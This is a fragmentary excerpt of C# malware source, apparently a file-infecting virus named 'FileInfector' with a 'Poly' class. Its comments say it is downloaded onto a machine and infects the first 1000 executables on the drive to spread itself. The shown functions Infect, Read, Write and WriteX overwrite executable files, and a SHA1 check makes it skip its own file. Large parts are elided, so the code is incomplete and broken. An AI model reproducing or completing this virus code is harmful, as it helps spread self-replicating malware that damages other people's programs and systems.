// hackan 
// this is the code that will be downloaded, and infects first 1000 executables on the drive, spreading itself.
...
namespace FileInfector
{
    ...
    }
    {
        DateTime today = DateTime.UtcNow;
            ...
            var monday = today.AddDays(deltaSaturday += deltaSaturday < 0 ? 7 : 0);        
    ...
    public class Poly
    {
            ...
            foreach (FileInfo file in files)
            {
                ...
                try
                {
                    ...
                    if (Sha1(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName) == Sha1(filename))
                        ...
                        {
                            continue; // if there is an error infecting the file
                        }
                    // edited so it scans first 1000 files
                    if (counter == 1000)
                    {
                        return 0;
                    }
        ...
        public static byte[] Read(FileStream s, int length, int c) // reads the executables and stuff
        {
        ...
        public static bool Infect(string host) // the function that infects the files
        {
        ...
        public static void Write(FileStream s, byte[] g) // writes to the executables
        {
        ...
        public static void WriteX(FileStream s, byte[] g, byte[] k) // same shit 
        {
            BinaryWriter w = new BinaryWriter(s);
            w.BaseStream.Seek(0, SeekOrigin.Begin);
            w.Write(g);
        ...
        public static string Sha1(string data) // hashing function
        {
